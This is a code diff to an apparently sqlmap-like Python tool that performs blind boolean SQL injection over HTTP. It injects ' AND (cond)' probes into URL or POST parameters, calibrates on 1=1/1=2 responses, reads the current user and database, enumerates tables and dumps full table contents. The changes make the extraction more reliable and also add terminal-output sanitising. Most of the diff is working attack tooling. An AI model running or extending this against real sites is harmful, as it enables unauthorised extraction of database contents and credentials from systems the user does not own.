@@ -10,6 +10,10 @@ from .engine import Esperanto, hostExtract
 from .records import (
     OracleUndecided, ExtractResult, QueryBudgetExceeded)
 
+# ratio-mode confidence margin: if the true/false similarity scores are within this of each
+# other the page can't be classified, so the oracle returns UNDECIDED rather than guessing.
+_RATIO_MARGIN = 0.05
+
 
 def _sqliteOracle(block=None):
     """In-memory SQLite boolean oracle for the self-test (DBMS hidden from prober).
@@ -218,10 +222,10 @@ def _selftest():
         pass
     # extract using ONLY the strategy + oracle (no Esperanto retrieval code)
     got = hostExtract(oracle, strat, "(SELECT name FROM users WHERE id=1)")
-    assert got == "Admin-42", "hostExtract via strategy failed: %r" % got
+    assert got.value == "Admin-42" and got.exact, "hostExtract via strategy failed: %r" % got
     row = strat.asQueriesRow()
     assert row["substring"] and row["length"] and row["inference"], "queries-row incomplete: %r" % row
-    print("  strategy: frozen + hostExtract('%s')=%r + queries.xml row rendered" % (strat.compare_mode, got))
+    print("  strategy: frozen + hostExtract('%s')=%r (exact) + queries.xml row rendered" % (strat.compare_mode, got.value))
     print("SELF-TEST PASSED (all compare modes + identify + bytes + quorum + integrity + strategy)")
 
 
@@ -364,19 +368,22 @@ def _httpOracle(url, data=None, cookie=None, headers=None, string=None, notStrin
         return (HTTPSConnection if scheme == "https" else HTTPConnection)(netloc, timeout=30)
 
     def fetch(cond):
-        if "[INFERENCE]" in (url + (data or "")):           # verbatim (caller owns the context)
-            u_raw = url.replace("[INFERENCE]", cond)
-            d_raw = data.replace("[INFERENCE]", cond) if data else data
+        # encode the INJECTED fragment fully and splice it into the (already-encoded) URL, so a
+        # '&' or '%' produced by the SQL (Access '&' concat, LIKE '%') becomes %26/%25 inside the
+        # parameter VALUE - it can't turn into a new HTTP parameter separator or a stray escape.
+        if "[INFERENCE]" in (url + (data or "")):           # verbatim marker (caller owns context)
+            payload = _quote(cond, safe="")
+            u_raw = url.replace("[INFERENCE]", payload)
+            d_raw = data.replace("[INFERENCE]", payload) if data else data
         else:                                               # '*' -> boolean AND at the mark
-            ins = " AND (%s)" % cond
+            ins = _quote(" AND (%s)" % cond, safe="")
             u_raw = url.replace("*", ins, 1) if "*" in url else url
             d_raw = data.replace("*", ins, 1) if (data and "*" in data) else data
-        # keep the '='/'&' param structure, encode the rest so spaces/metachars survive
-        parts = urlsplit(u_raw)
+        parts = urlsplit(u_raw)                             # the surrounding URL is already user-encoded
         path = parts.path or "/"
         if parts.query:
-            path += "?" + _quote(parts.query, safe="=&")
-        body = _quote(d_raw, safe="=&").encode("utf-8") if d_raw else None
+            path += "?" + parts.query
+        body = d_raw.encode("utf-8") if d_raw else None
         method = "POST" if body else "GET"
         hdrs = {"User-Agent": "esperanto", "Connection": "keep-alive"}
         if body:
@@ -406,7 +413,8 @@ def _httpOracle(url, data=None, cookie=None, headers=None, string=None, notStrin
                 except Exception:
                     pass
                 _conn["c"] = None                           # force a reconnect on the retry
-        return "", 0
+        return None, None                                   # transport FAILED -> undecided, NOT ("",0)
+                                                            # (an empty body must never look like a False page)
 
     dyn = set()
 
@@ -426,6 +434,8 @@ def _httpOracle(url, data=None, cookie=None, headers=None, string=None, notStrin
         mode, wanted = "code", int(code)
     else:                                                   # auto-calibrate
         (t1, s1), (t2, s2), (f1, sf) = fetch("1=1"), fetch("1=1"), fetch("1=2")
+        if t1 is None or t2 is None or f1 is None:
+            raise SystemExit("[!] cannot calibrate oracle: transport failed on a control request")
         dyn = set(t1.split("\n")) ^ set(t2.split("\n"))     # varies between identical requests -> dynamic
         tc, fc = _clean(t1, "1=1"), _clean(f1, "1=2")
         if s1 == s2 and s1 != sf:                           # (1) HTTP status alone separates true/false
@@ -449,8 +459,10 @@ def _httpOracle(url, data=None, cookie=None, headers=None, string=None, notStrin
     if not string and not notString:
         print("[*] calibrated oracle: %s%s" % (mode, (" (%r)" % wanted) if mode in ("code", "autostring") else ""))
 
-    def oracle(cond):
+    def classify(cond):
         body, status = fetch(cond)
+        if body is None:                                    # transport failure -> UNDECIDED (tri-state):
+            return None                                     # let the engine retry/degrade, never a fake bool
         if mode == "string":
             return string in body
         if mode == "notstring":
@@ -462,9 +474,99 @@ def _httpOracle(url, data=None, cookie=None, headers=None, string=None, notStrin
         c = _clean(body, cond)
         st = difflib.SequenceMatcher(None, c, base["t"]).quick_ratio()
         sf = difflib.SequenceMatcher(None, c, base["f"]).quick_ratio()
-        return st >= sf
+        if abs(st - sf) < _RATIO_MARGIN:                    # too close to call -> undecided, not a coin-flip
+            return None
+        return st > sf
+
+    state = {"n": 0, "dead": False}
+
+    def oracle(cond):
+        # PERIODIC control revalidation: over thousands of requests the baseline can drift
+        # (auth expiry, rate-limit page, CDN challenge, redeploy, marker swap). Every 256 probes
+        # re-run the known controls; if 1=1/1=2 stop separating, SUSPEND (return undecided) rather
+        # than keep feeding a broken model into bisection.
+        state["n"] += 1
+        if state["n"] % 256 == 0 or state["dead"]:
+            t, f = classify("1=1"), classify("1=2")
+            state["dead"] = not (t is True and f is False)
+            if state["dead"]:
+                print("[!] oracle controls no longer separate (1=1=%r, 1=2=%r) - suspending" % (t, f))
+                return None
+        return classify(cond)
 
     return oracle
+
+
+def _safeterm(s):
+    """Neutralize control/escape bytes in DB content before it reaches the terminal - stored
+    values can carry ANSI cursor/title/OSC sequences, embedded newlines or fake log prefixes
+    that would otherwise manipulate or forge the operator's console."""
+    if s is None:
+        return s
+    # escape C0 (< 0x20), DEL (0x7f) AND C1 (0x80-0x9f) controls - a bare 0x9b is an ANSI CSI
+    # introducer, so leaving the C1 range through would still let stored content drive the terminal
+    return "".join(c if (u" " <= c < u"\x7f") or c > u"\x9f" else "\\x%02x" % ord(c) for c in s)
+
+
+def _printTable(columns, rows):
+    """Render a bordered, column-aligned table (sqlmap-style) instead of raw ' | ' joins."""
+    cells = [["NULL" if v is None else _safeterm(v) for v in row] for row in rows]
+    widths = [max([len(columns[i])] + [len(r[i]) for r in cells]) for i in range(len(columns))]
+    bar = "+" + "+".join("-" * (w + 2) for w in widths) + "+"
+    line = lambda vals: "| " + " | ".join(v.ljust(widths[i]) for i, v in enumerate(vals)) + " |"
+    print(bar)
+    print(line(columns))
+    print(bar)
+    for r in cells:
+        print(line(r))
+    print(bar)
+
+
+import binascii as _binascii
+_HEX = set("0123456789abcdefABCDEF")
+
+
+def _previewFramed(partial):
+    """A hex-framed row payload decoded into the value AS IT ARRIVES - including the in-progress
+    token's completed bytes - so the live line grows CHARACTER BY CHARACTER, like sqlmap. Handles
+    BOTH grammars: length-framed `V<len>:<hex>;` / `N;` and the legacy `V<hex>` / `N` (','-sep).
+    Returns None when `partial` isn't a framed payload."""
+    if not partial or partial[0] not in "NV" or any(c not in _HEX and c not in ",:;NV" for c in partial):
+        return None
+
+    def _dec(h):
+        h = h[:len(h) - (len(h) % 2)]               # only WHOLE bytes so far
+        try:
+            return _binascii.unhexlify(h).decode("utf-8", "replace")
+        except Exception:
+            return "?"
+
+    out = []
+    if ";" in partial or ":" in partial:            # length-framed grammar: V<len>:<hex>; / N;
+        for t in partial.split(";"):
+            if not t:
+                continue
+            if t == "N":
+                out.append("NULL")
+            elif t.startswith("V"):
+                _lp, _sep, hx = t[1:].partition(":")
+                out.append(_dec(hx))
+        return ", ".join(out)
+    for t in partial.split(","):                    # legacy grammar
+        if t == "N":
+            out.append("NULL")
+        elif t.startswith("V"):
+            out.append(_dec(t[1:]))
+    return ", ".join(out)
+
+
+def _scalar(esp, expr):
+    """A user-facing scalar that DISPLAYS its integrity instead of erasing it: an inexact
+    (truncated / case-ambiguous / unverified) value is shown with its status, never as if exact."""
+    r = esp.extractResult(expr)
+    if r.value is None:
+        return "NULL" if r.is_null else "n/a (unresolved)"
+    return _safeterm(r.value) if r.exact else "%s   [%s]" % (_safeterm(r.value), r.integrity)
 
 
 def _report(esp, args):
@@ -480,7 +582,13 @@ def _report(esp, args):
     if scope is None and (args.tables or args.columns or args.dump):
         dbexpr = esp.dialect.identity.get("database")
         try:
-            cur = esp.extract(dbexpr) if dbexpr else None
+            r = esp.extractResult(dbexpr) if dbexpr else None
+            # the scope name becomes a keyset bound / schema qualifier - a case/accent-ambiguous
+            # spelling would mis-target (merge a system-schema table, yield a 0-row dump), so
+            # require a byte-exact read, exactly as the sqlmap handler's _safeExtract does.
+            cur = r.value if (r and r.exact) else None
+            if r and r.value and not r.exact:
+                print("[!] scope database name not byte-exact (%s) - not scoping" % r.integrity)
         except Exception:
             cur = None
         if args.tbl and (args.columns or args.dump):
@@ -494,10 +602,10 @@ def _report(esp, args):
             print("[*] scoping to database/schema: %s" % scope)
     if args.current_user:
         expr = esp.dialect.identity.get("user")
-        print("[*] current user: %s" % (esp.extract(expr) if expr else "n/a"))
+        print("[*] current user: %s" % (_scalar(esp, expr) if expr else "n/a"))
     if args.current_db:
         expr = esp.dialect.identity.get("database")
-        print("[*] current database: %s" % (esp.extract(expr) if expr else "n/a"))
+        print("[*] current database: %s" % (_scalar(esp, expr) if expr else "n/a"))
     if args.tables:
         print("[*] fetching tables ...")
         print("[*] tables: %s" % ", ".join(esp.enumerate("table", schema=scope) or ["<none>"]))
@@ -509,7 +617,7 @@ def _report(esp, args):
             print("[*] columns of %s: %s" % (args.tbl, ", ".join(esp.columns(args.tbl, schema=scope) or ["<none>"])))
     if args.query:
         print("[*] fetching %s ..." % args.query)
-        print("[*] %s = %r" % (args.query, esp.extract(args.query)))
+        print("[*] %s = %s" % (args.query, _scalar(esp, args.query)))
     if args.dump:
         if not args.tbl:
             print("[!] --dump needs -T <table>")
@@ -519,14 +627,24 @@ def _report(esp, args):
                 print("[*] fetching columns for table '%s' ..." % args.tbl)   # 'entries' phase below streams ROWS, not column names
                 cols = esp.columns(args.tbl, schema=scope) or None
             print("[*] fetching entries for table '%s' ..." % args.tbl)
-            result = esp.dump(args.tbl, columns=cols, schema=scope)
+            # NO silent internal 10-row cap: honor --stop, else dump ALL rows (by COUNT) and
+            # always print whether the result is complete.
+            if getattr(args, "stop", None):
+                limit = args.stop
+            else:
+                try:
+                    limit = esp.extractInteger("(SELECT COUNT(*) FROM %s)" % esp.qualify(args.tbl, scope)) or 10
+                except Exception:
+                    limit = 1 << 30
+            result = esp.dump(args.tbl, columns=cols, schema=scope, limit=limit)
             if not result or not result["columns"]:
                 print("[!] could not dump %s" % args.tbl)
             else:
-                print("[*] %s (%d rows):" % (args.tbl, len(result["rows"])))
-                print("    " + " | ".join(result["columns"]))
-                for row in result["rows"]:
-                    print("    " + " | ".join("NULL" if v is None else v for v in row))
+                tag = "" if result["complete"] else " - INCOMPLETE (%s)" % (result.get("keyed_by") or "best-effort")
+                if not result.get("exact", True):    # coverage complete but content collation-dependent
+                    tag += " - INEXACT (case/accents may differ)"
+                print("[*] Table: %s (%d entries%s)" % (args.tbl, len(result["rows"]), tag))
+                _printTable(result["columns"], result["rows"])
 
 
 def main(argv=None):
@@ -565,6 +683,7 @@ def main(argv=None):
     parser.add_argument("-D", dest="db", help="database/schema to enumerate")
     parser.add_argument("-T", dest="tbl", help="table to enumerate")
     parser.add_argument("-C", dest="col", help="columns to dump (comma-separated)")
+    parser.add_argument("--stop", type=int, help="max rows to dump (default: all)")
     # internal dev/test harness switches - functional but hidden from --help (--live drives the
     # local-Docker DBMS livetest; --waf is a livetest-only fault-injection mode, NOT a real WAF bypass)
     parser.add_argument("--live", action="store_true", help=argparse.SUPPRESS)
@@ -586,10 +705,25 @@ def main(argv=None):
     esp = Esperanto(_httpOracle(target, args.data, args.cookie, args.header,
                                 args.string, args.not_string, args.code))
     import sys as _sys
-    def _live(value):                           # signs of life during the (slow, blind) extraction
-        _sys.stdout.write("[*] retrieved: %s\n" % value)
+    _tty = _sys.stdout.isatty()
+    def _charLive(partial, total):
+        # LIVE char-by-char on ONE rewriting line, exactly like sqlmap: the value grows in
+        # place ([*] retrieved: e -> em -> ema -> ...) and is FINALIZED with a newline when
+        # complete, so it can't collide with the next message. Framed rows preview as cells.
+        shown = _previewFramed(partial)
+        if shown is None:
+            shown = partial
+        _sys.stdout.write("\r\033[K[*] retrieved: %s" % _safeterm(shown[-200:]))
+        if len(partial) >= total:               # value complete -> keep it and drop to a new line
+            _sys.stdout.write("\n")
         _sys.stdout.flush()
-    esp._progress = _live
+    def _plainLive(value):                      # piped/non-tty: one plain line per value, no control codes
+        _sys.stdout.write("[*] retrieved: %s\n" % _safeterm(value))
+        _sys.stdout.flush()
+    if _tty:
+        esp._charProgress = _charLive           # animated char-by-char is the sole feedback on a terminal
+    else:
+        esp._progress = _plainLive              # logs/pipes get clean per-value lines instead
     print("[*] discovering the back-end SQL dialect (agnostic mode) ...")
     try:
         esp.discover()
